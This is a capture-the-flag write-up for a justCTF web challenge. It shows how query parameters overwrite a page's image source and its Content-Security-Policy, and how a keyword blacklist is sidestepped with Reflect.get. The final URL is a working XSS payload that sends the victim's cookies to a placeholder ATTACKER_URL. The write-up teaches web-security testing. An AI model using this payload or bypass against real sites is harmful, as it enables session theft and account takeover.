# eXtra Safe Security layers

## Flag
justCTF{M4nY_L4y3rS_M4nY_f4ilur3s_ae5bda97-8543-4a4b-84bf-22c6a0df6bdf}

## Solution

The web application reflects the text from the value of the `text` parameter in the query string and use a middleware which sanitizes HTML tags:
```
// Safety layer 1
// "middleware which sanitizes user input data (in req.body, req.query, req.headers and req.params) to prevent Cross Site Scripting (XSS) attack."
// = XSS impossible ;)
app.use(xss());
```

The server sets the filename of the background image in a template depending on whether the user is an admin or a normal user to "admin_background.png" or "background.png", respectively.
```JavaScript
	if (req.cookies?.admin === adminCookie) {
		res.user = {
			isAdmin: true,
			text: "Welcome back :)",
			unmodifiable: {
				background: "admin_background.png",
				CSP: `default-src 'self'; img-src 'self'; style-src '${css}'; script-src '${adminJs}' '${commonJs}';`,
			},
		};
	} else {
		// Safety layer 4
		res.user = {
			text: "Hi! You can modify this text by visiting `?text=Hi`. But I must warn you... you can't have html tags in your text.",
			unmodifiable: {
				background: "background.png",
			},
		};
	}
```

```HTML
    <script>
        // load background...
        main.innerHTML += `
            <img class='background' src='<%- unmodifiable?.background %>'>
        `;
        console.log('Loaded!');
    </script>
```

Since the following is being used on the web application, we can overwrite values in `res.user`:
```JavaScript
	if (req.query.text) {
		res.user = { ...res.user, ...req.query };
	}
```

We can use the query parameter `unmodifiable[background]` for changing the value of `unmodifiable.background` for example with http://xssl.web.jctf.pro/?text=a&unmodifiable[background]=example.
The web application also uses a CSP:
```JavaScript
	res.set("Content-Security-Policy", res.user.unmodifiable.CSP ?? defaultCSP);
```
The value `unmodifiable.CSP` can be overwritten the same way as we overwrite the value of `unmodifiable.background`.

The web application also uses a blacklist, but it can be bypassed by using [Reflect](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect).
```JavaScript
const blacklist = [
	"fetch",
	"eval",
	"alert",
	"prompt",
	"confirm",
	"XMLHttpRequest",
	"request",
	"WebSocket",
	"EventSource",
];
```

We can test that the payloads work by opening the URL http://xssl.web.jctf.pro/?text=a&unmodifiable[background]=%27%20onerror=%27Reflect.get(window,%22a%22%2B%22lert%22)()&unmodifiable[CSP]=.

Then, we submit the URL `http://xssl.web.jctf.pro/?text=a&unmodifiable[background]=%27%20onerror=%27Reflect.get(window,%22f%22%2B%22etch%22)(%22ATTACKER_URL?%22%2Bbtoa(document.cookie))&unmodifiable[CSP]=` to the bot and get the flag.
